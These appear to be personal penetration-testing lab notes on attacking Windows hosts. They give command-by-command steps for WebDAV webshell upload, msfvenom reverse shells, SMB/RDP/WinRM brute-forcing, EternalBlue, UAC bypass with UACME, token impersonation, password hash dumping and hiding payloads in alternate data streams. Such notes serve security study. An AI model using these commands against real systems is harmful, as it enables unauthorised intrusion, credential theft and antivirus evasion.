# Host Based Attacks

- Targeted against a specific host/system

## Overview over Windows vulnerabilities

**Types of windows vulnerabilities (not complete)**

- Information Disclosure
- buffer overflows
- Remote code execution
- privilege escalation
- Denial of Service

**Frequently Exploited Windows services**

- **|** Microsoft IIS **|** TCP Ports 80/443 **|** Proprietary web server **|**
- **|** WebDav(Web Distributed Authoring & versioning) **|** TCP Ports 80/443 **|** HTTP extention that Allows client to update, delete , move and copy files on a web server. WebDAV is used to enable a web server to act as a file server. **|**
- **|** SMB/CIFS(Server Message Block Protocol) **|** TCP port 445 **|** Network file share on a LAN **|**
- **|** RDP **|** TCP port 3389 **|** Remotely authenticate and interact with a Windows system **|**
- WinRM(Windows Remote Management Protocol) **|** TCP ports 5986/443 **|** Windows remote management protocol that can be used to facilitate remote access with windows systems. **|**

**Exploiting Microsoft IIS WebDAV**
Configured to run on ports 80/443

- Supported executable file extentions: .asp, .aspx, .config, .php
- edits and manage files
- connect through credentials
  _Tools_

  - davtest - used to scan, authenticate and exploit a WebDAV server
  - cadaver - cadaver supports file upload, download, on-screen display etc

  _Exploitation process_

  - Identify whether WebDav has been configured to run on the IIS web server
  - brute-force attact on order to identify legitamate credentials we can use for authentication

  * authenticate then upload a malicious .asp payload that can be used to execute arbitary commands or optain a reverse shell on the target

  _Step-by step_

  1. Do nmap scan: `nmap -sV -sC 10.10.x.x`
  2. after identifying IIS Web DAV: `nmap -sV -p 80 --script= http-enum 10.10.x.x`
  3. go to browser `10.10.x.x/webdev` , here you can authenticate once you have credentials
  4. Hydra to brute force: `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_paswords.txt 10.10.x.x http-get /webdav/`, example wordlist(that might work)
  5. log in
  6. use davtest: `davtest -auth username:password -url http://10.10.x.x/webdav `, will whow you what files can be uploded and files that can be executed, the last is important and shows us an attack vector
  7. use cadaver to upload file: `cadaver http://10.10.x.x/webdav`, then authenticate.
  8. upload a webshell(asp) through cadaver when connected: `put /usr/share/webshells/asp/webshell.asp`.
  9. Go to browser again to see if it has been uploaded and click on the .asp file, then run commands on the page: to look at C:\ drive type `dir C:\` , to see file(flag.txt), type `type C:\flag.txt`

_with metasploit_

1.  scan first to check if IIS Web DAV is there
2.  create your own payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=1234 -f asp > shell.asp`
3.  open cadaver and connect to the webdav: `cadaver http://10.10.x.x/webdav` , then upload the shell file: `put /root/shell.asp`
4.  start postgres server and msfconsole: `service postgresql start && msfconsole`.
5.  msfconsole: `use multi/handler` , `set payload /windows/meterpreter/reverse_tcp `, `set LHOST and LPORT`(same as shell.asp), hit `run`
6.  open browser and click on the shell.asp file that was uploaded
7.  find what you are looking for.
8.  _You can use a metaasploit script for automating all of it_. in msfconsole `search iis upload`, looking for exploit/windows/iis/iis_webdav_upload_asp

**Exploiting SMB with PsExec**

- user authentication
- share authentication

1. nmap sca `nmap -sV -sC 10.10.x.x`
2. smb brute force, start msfconsole: `service postgresql start && msfconsole`
3. msfconsole: `serach smb_login` and use.
4. set options:
   - `set RHOSTS`,
   - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`,
   - `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt`,
   - `set VERBOSE false` < - for only succeced attempts
5. use psexec.py to login with found credentials: `psecexec.py Administrator@10.10.x.x cmd.exe`, fill in the passwords

_use psexec with metasploit_

1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options

**Eternal Blue**

1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
2. msfconsole: `search eternalblue`
3. `use exploit/windows/smb/ms17:010_eternalblue`
4. set options

**Exploiting RDP**

- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port
- preform a bruteforce

1. preform nmap: `nmap -sV -p- 10.10.x.x`
2. verify RDP port by using msfconsole: `service postgresql start && msfconsole`
3. search msfconsole: `search rdp_scanner` (auxilary/scanner/rdp/rdp_scanner)
4. set options: `set RHOSTS` & `set RPORT` and run
5. brute-force HYDRA: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.10.x.x -s <port>`
6. xfreerdp with creds: `xfreerdp /u:username /p:password /v:10.10.x.x:port`

**Exploit WinRM**

- Windows remote managment facilitates remote access with windows systems over HTTP(s)
- WinRM Typically uses TCP port 5985 and 5986(HTTPS)
- can use crackmapexec to perform a brute-force on WinRM
- also evil-winrm to optain command shell

1. scan with nmap `nmap -sV -sC -p5000-6000 10.10.x.x` , the result will not say that it is WinRM, but from the port number we can deduce it
2. use crackmapexec to both confirm and brute force: `crackmapecex`
3. In crackmapexec: `crackmapexec winrm 10.10.x.x -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
4. after opataining creds check command with -x: `crackmapexec winrm 10.10.x.x -u administrator -p tinkerbell -x "whoami"` or "systeminfo"
5. evil-winrm to get shell: `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.19.116`
6. find flag

_meterpreter_

1. `service postgresql start && msfconsole`
2. search: `search winrm_script`, look for exploit/windows/winrm/winrm_script_excec
3. set options + also set FORCE_VBS true

## Privelege Escalation

**meterpreter elevation**

- in msfconsole you can use the privelege escalation suggester.

1. when logged in to meterpreter, on the system you have compromised with low level creds, type `getsystem` to see if you can just raise priveleges that way. if not go to step 2.
2. after gaining access to the machine in msfconsole(nmap scan then get creds(low level), then get access), background the session( `background` see picture) search for `search suggester`
   ![alt text](/assets/meterpreter_background_session.png)
3. `use post/multi/recon/local_exploit_suggester`
4. run one of the following that fits

**Windows Kernel exploits**

- user mode, limited access
- kernel mode, highest level of access

**Bypassong UAC with UACME**

- User Account Control
- Windows security feature
- can be bypassed

Pre-requisites to bypass UAC:

1. access to user Account
   that is part og the local administrators group on the windows target system
2. if UAC protection level is set below high, windows programs can be executed with elevated privileges without the user for confirmation
3. tools will vary by windows version

**Exploit UAC**
STEP 1: Getting user account

1.  nmap scan, identify
2.  (this is for rejetto file server 2.3)
3.  open msfconsole: `service postgresql start && msfconsole`
4.  search rejetto vuln: `serach rejetto`
5.  configure options then run
6.  som commands and actions: 1.`sysinfo`, 2.`pgrep explorer`, 3.`migrate <number you got from prev command>`,

**Privelege escalation:**
github repository for exploiting:https://github.com/hfiref0x/UACME
STEP 2: Privelege escalation

7. create a reaverseshell: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=1234 -f exe > shell.exe`
8. set up listener, new msfconsole session: `msfconsole`
9. in msfvenom `use multi/handler`
10. payload: `set payload windows/meterpreter/reverse_tcp`
11. `set LHOST` , `set LPORT` <-- to port created in shell.exe, then hit `run`
12. IN THE WINDOWS ACCOUNT METERPRETER SESSION: navigate to C: `cd C:\\`
13. create Temp dir: `mkdir Temp` then `cd Temp`
14. Upload shell `upload shell.exe`
15. upload Akagai64(UAC Exploit): `upload /root/Desktop/tools/UACME/Akagi64.exe`
16. open shell session: `shell`
17. exploit method 23, should bet elevated privs: `.\Akagi64.exe 23 C:\Temp\shell.exe`
18. migrate to lsass.exe(for NT AUTHORITY\SYSTEM): list processes:`ps`, `migrate 688` <--PID number , when in folder(INFO):`C:\Windows\system32`
19. get hashdump NTLM hashdump: `hashdump`

### Privelege Escalation: Access Token Impersonation

- Privileges required for a successful impersonation attack:
  - SeAssignPrimaryToken
  * SeCreateToken
  - SeImpersonatePrivilage

INFO: this also exploit the rejetto 2.3 version as UAC with UACME

1. `service postgresql start && msfconsole` -> `search rejetto`
2. set options then `run`
3. `getprivs` to check if you have the required privileges
4. `load incognito`
5. `list_tokens -u`
6. `impersonate_token "highest_level\Administrator"` <- copy the highest level you find(, if no high level is found you need to do a potato attack(?)) then run
7. `pgrep explorer` -> `migrate number_found`
8. `cat C:\\UsersAdministrator\\Desktop\\flag.txt`

### Alternate Data Streams

- ADS, NTFS file attribute.
- two forks: 1. Data stream(data of the file), 2.Resource stream(meta data)
- Attackers use ADS to hide malicious code or executable in legidimate files
- evade AVs and static scanning tools
- hide in resource stream

1. on windows: `notepad legitimate_file.txt:secret_file.txt`, create the file
2. if you want to open hidden file: `notepad legitimate_file.txt:secret_file.txt`
3. hide executable `notepad legitimate_file.txt:payload.exe`
4. move .exe in secret .txt file, on windows: `type payload.exe > legimitate_file:payload.exe`
5. run file(on windows): `start legitimate_file.txt:payload.exe`
6. Not working? symbolic link: `cd Windows\System32` -> `mklink wupdate.exe C:\absolute_file_path(ususally Temp fodler)\legitimate_file.txt:payload.exe`
7. may not work if you do not have adm privileges.
